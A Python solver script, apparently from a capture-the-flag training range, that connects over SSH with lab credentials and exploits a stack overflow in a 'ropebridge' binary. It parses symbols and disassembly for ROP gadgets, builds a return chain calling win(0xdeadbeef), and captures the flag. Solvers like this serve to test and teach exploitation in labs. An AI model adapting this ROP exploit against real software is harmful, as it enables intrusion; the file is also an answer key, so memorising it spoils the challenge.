"""Intended-path solver: derive padding and chain addresses from symbols.txt,
then ride the return chain into win(0xdeadbeef)."""

import base64
import re
import struct
import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

SYMBOLS_CMD = "cat /opt/challenges/symbols.txt"
DUMP_CMD = "cat /opt/challenges/dump.asm"
DEPTH_CMD = "/opt/challenges/ropebridge < /dev/null 2>&1 | head -1"
SYMBOL_LINE = re.compile(r"^([0-9a-f]{8,16}) [Tt] (\S+)$", re.MULTILINE)
DEPTH_LINE = re.compile(r"buffer is (\d+) bytes deep")
# The named gadget functions carry frame-setup prologues, so the usable
# gadgets are the raw instructions inside them: a pop %rdi immediately
# followed by ret, and any standalone ret byte.
POP_RDI_RET_RE = re.compile(r"([0-9a-f]+):\s+5f\s+pop\s+%rdi\s*\n\s*[0-9a-f]+:\s+c3\s+ret")
RET_RE = re.compile(r"([0-9a-f]+):\s+c3\s+ret")


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def _run(client, cmd: str, timeout: int) -> str:
    _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode(errors="replace") + stderr.read().decode(errors="replace")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        captured = None
        detail = None

        symbols_text = _run(client, SYMBOLS_CMD, 20)
        symbols = {name: int(addr, 16) for addr, name in SYMBOL_LINE.findall(symbols_text)}
        dump_text = _run(client, DUMP_CMD, 20)
        pop_rdi = POP_RDI_RET_RE.search(dump_text)
        bare_ret = RET_RE.search(dump_text)
        banner = _run(client, DEPTH_CMD, 20)
        depth = DEPTH_LINE.search(banner)

        if "win" not in symbols:
            detail = f"symbols.txt lacks win: {sorted(symbols)[:10]}"
        elif pop_rdi is None or bare_ret is None:
            detail = "dump.asm lacks a pop %rdi; ret gadget and a bare ret"
        elif depth is None:
            detail = f"banner did not disclose buffer depth: {banner[:120]}"
        else:
            padding = b"A" * (int(depth.group(1)) + 8)
            chain = (
                padding
                + struct.pack("<Q", int(pop_rdi.group(1), 16))
                + struct.pack("<Q", 0xDEADBEEF)
                + struct.pack("<Q", int(bare_ret.group(1), 16))
                + struct.pack("<Q", symbols["win"])
            )
            payload = base64.b64encode(chain).decode()
            run_cmd = (
                "printf '%s' '" + payload + "' | base64 -d | /opt/challenges/ropebridge; echo RC=$?"
            )
            out = _run(client, run_cmd, 30)
            flags = find_flags(out)
            captured = flags[0] if flags else None
            if not captured:
                detail = f"chain did not reach the summit: {out[-300:]}"
    finally:
        client.close()
    return SolveResult(
        results=[
            TaskResult(
                task_id="ret2win-chain",
                ok=bool(captured),
                captured=captured,
                detail=detail,
            )
        ]
    )
